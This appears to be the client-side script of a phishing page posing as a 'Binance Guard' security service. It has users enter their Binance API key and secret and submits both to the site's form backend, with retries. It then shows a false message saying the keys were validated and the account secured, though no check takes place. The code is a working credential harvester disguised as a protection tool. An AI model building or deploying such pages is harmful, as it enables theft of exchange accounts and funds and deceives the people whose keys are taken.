// Constants
const STORAGE_KEY = 'access0214';
const ACCESS_TIMEOUT = 3600000; // 1 hour in milliseconds
const DEBOUNCE_DELAY = 300; // Debounce delay for input validation
const MAX_RETRY_ATTEMPTS = 3;
const RETRY_DELAY = 1000;

// Utils
const $ = (selector) => document.querySelector(selector);
const $$ = (selector) => document.querySelectorAll(selector);

// Debounce utility function
const debounce = (func, delay) => {
  let timeoutId;
  return (...args) => {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => func.apply(null, args), delay);
  };
};

// Performance monitoring
const performanceMonitor = {
  marks: new Map(),
  
  mark(name) {
    if (performance && performance.mark) {
      performance.mark(name);
      this.marks.set(name, performance.now());
    }
  },
  
  measure(name, startMark) {
    if (performance && performance.measure && this.marks.has(startMark)) {
      try {
        performance.measure(name, startMark);
      } catch (e) {
        console.warn('Performance measurement failed:', e);
      }
    }
  }
};

class BinanceGuard {
  constructor() {
    this.form = $('#apiForm');
    this.submitBtn = $('.submit-btn');
    this.loading = $('#loading');
    this.btnText = this.submitBtn.querySelector('span');
    this.messageContainer = document.createElement('div');
    
    this.init();
  }

  init() {
    this.setupMessageContainer();
    this.setupFormValidation();
    this.setupInputAnimations();
    this.checkAccess();
    this.setupAutoLogout();
  }

  setupMessageContainer() {
    this.messageContainer.className = 'message';
    this.form.appendChild(this.messageContainer);
  }

  showMessage(message, type = 'info') {
    this.messageContainer.textContent = message;
    this.messageContainer.className = `message message-${type}`;
    this.messageContainer.style.display = 'block';

    if (type === 'success') {
      setTimeout(() => {
        this.messageContainer.style.display = 'none';
      }, 5000);
    }
  }

  setupFormValidation() {
    this.form.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const formData = new FormData(this.form);
      formData.set('timestamp', new Date().toISOString());

      if (!this.validateForm(formData)) return;

      await this.submitForm(formData);
    });
  }

  validateForm(formData) {
    const apiKey = formData.get('apiKey').trim();
    const apiSecret = formData.get('apiSecret').trim();

    if (!apiKey || !apiSecret) {
      this.showMessage('Please fill in all fields', 'error');
      return false;
    }

    // More flexible validation - accept various formats
    if (apiKey.length < 10 || apiSecret.length < 10) {
      this.showMessage('API keys must be at least 10 characters long', 'error');
      return false;
    }

    if (apiKey.length > 200 || apiSecret.length > 200) {
      this.showMessage('API keys are too long (max 200 characters)', 'error');
      return false;
    }

    return true;
  }

  async submitForm(formData) {
    this.setLoadingState(true);
    performanceMonitor.mark('form-submit-start');

    // Check if we're on Netlify or local development
    const isNetlify = window.location.hostname.includes('netlify') || window.location.hostname.includes('your-domain');
    const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
    
    if (isLocalhost) {
      // Simulate success for local development
      setTimeout(() => {
        this.handleSuccess();
      }, 2000);
      return;
    }

    let retryCount = 0;
    const maxRetries = MAX_RETRY_ATTEMPTS;

    while (retryCount <= maxRetries) {
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout

        const response = await fetch('/', {
          method: 'POST',
          body: formData,
          headers: {
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
          },
          signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
          if (response.status >= 500 && retryCount < maxRetries) {
            retryCount++;
            await new Promise(resolve => setTimeout(resolve, RETRY_DELAY * retryCount));
            continue;
          }
          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }

        performanceMonitor.measure('form-submit-duration', 'form-submit-start');
        this.handleSuccess();
        return;

      } catch (error) {
        if (error.name === 'AbortError') {
          this.handleError(new Error('Request timeout. Please try again.'));
          return;
        }
        
        if (retryCount < maxRetries && this.isRetryableError(error)) {
          retryCount++;
          await new Promise(resolve => setTimeout(resolve, RETRY_DELAY * retryCount));
          continue;
        }
        
        this.handleError(error);
        return;
      }
    }
  }

  isRetryableError(error) {
    const retryableErrors = [
      'Failed to fetch',
      'NetworkError',
      'TypeError: Failed to fetch'
    ];
    return retryableErrors.some(errType => error.message.includes(errType));
  }

  setLoadingState(isLoading) {
    this.loading.style.display = isLoading ? 'inline-block' : 'none';
    this.btnText.textContent = isLoading ? 'Connecting...' : 'Activate Binance Guard';
    this.submitBtn.disabled = isLoading;
  }

  handleSuccess() {
    this.setLoadingState(false);
    this.btnText.textContent = 'Keys validated! Your account is secured.';
    this.submitBtn.style.background = 'linear-gradient(135deg, #22c55e, #16a34a)';
    this.showMessage('API keys successfully secured!', 'success');
    this.form.reset();

    setTimeout(() => {
      this.btnText.textContent = 'Activate Binance Guard';
      this.submitBtn.style.background = '';
    }, 3000);
  }

  handleError(error) {
    this.setLoadingState(false);
    
    let errorMessage = 'Error submitting form. Please try again.';
    
    // Provide more specific error messages
    if (error.message.includes('timeout')) {
      errorMessage = 'Request timeout. Please check your connection and try again.';
    } else if (error.message.includes('Failed to fetch')) {
      errorMessage = 'Network error. Please check your internet connection.';
    } else if (error.message.includes('404')) {
      errorMessage = 'Service temporarily unavailable. Please try again later.';
    } else if (error.message.includes('500')) {
      errorMessage = 'Server error. Please try again in a few moments.';
    }
    
    this.showMessage(errorMessage, 'error');
    console.error('Submission error:', error);

    setTimeout(() => {
      this.btnText.textContent = 'Activate Binance Guard';
      this.submitBtn.style.background = '';
    }, 3000);
  }

  setupInputAnimations() {
    $$('input').forEach(input => {
      const handleFocus = () => {
        if (input.parentElement) {
          input.parentElement.style.transform = 'scale(1.01)';
          input.parentElement.style.transition = 'transform 0.2s ease';
        }
      };

      const handleBlur = () => {
        if (input.parentElement) {
          input.parentElement.style.transform = '';
          input.parentElement.style.transition = '';
        }
      };

      // Real-time validation with debouncing
      const debouncedValidation = debounce((value) => {
        this.validateInputReal(input, value);
      }, DEBOUNCE_DELAY);

      input.addEventListener('focus', handleFocus);
      input.addEventListener('blur', handleBlur);
      input.addEventListener('input', (e) => {
        debouncedValidation(e.target.value);
      });
    });
  }

  validateInputReal(input, value) {
    const isValid = this.validateSingleInput(input, value);
    const wrapper = input.closest('.input-wrapper') || input.parentElement;
    
    if (wrapper) {
      wrapper.classList.toggle('input-valid', isValid && value.length > 0);
      wrapper.classList.toggle('input-invalid', !isValid && value.length > 0);
    }
  }

  validateSingleInput(input, value) {
    if (!value) return true; // Don't validate empty inputs
    
    const pattern = input.getAttribute('pattern');
    if (pattern) {
      const regex = new RegExp(pattern);
      return regex.test(value);
    }
    
    return true;
  }

  checkAccess() {
    const hasAccess = localStorage.getItem(STORAGE_KEY);
    const accessTime = localStorage.getItem(`${STORAGE_KEY}_time`);
    const currentTime = Date.now();

    if (!hasAccess || !accessTime || (currentTime - parseInt(accessTime)) > ACCESS_TIMEOUT) {
      this.logout();
    } else {
      $('#mainContent').style.display = 'block';
      localStorage.setItem(`${STORAGE_KEY}_time`, currentTime.toString());
    }
  }

  setupAutoLogout() {
    setInterval(() => this.checkAccess(), 5000);
  }

  logout() {
    localStorage.removeItem(STORAGE_KEY);
    localStorage.removeItem(`${STORAGE_KEY}_time`);
    window.location.replace('lockscreen.html');
  }
}

// Initialize on DOM load
document.addEventListener('DOMContentLoaded', () => {
  new BinanceGuard();
});

// Password toggle function
window.togglePassword = function() {
  const passwordInput = $('#apiSecret');
  const toggleIcon = $('#toggleIcon');
  
  const newType = passwordInput.type === 'password' ? 'text' : 'password';
  passwordInput.type = newType;
  
  toggleIcon.classList.toggle('fa-eye');
  toggleIcon.classList.toggle('fa-eye-slash');
};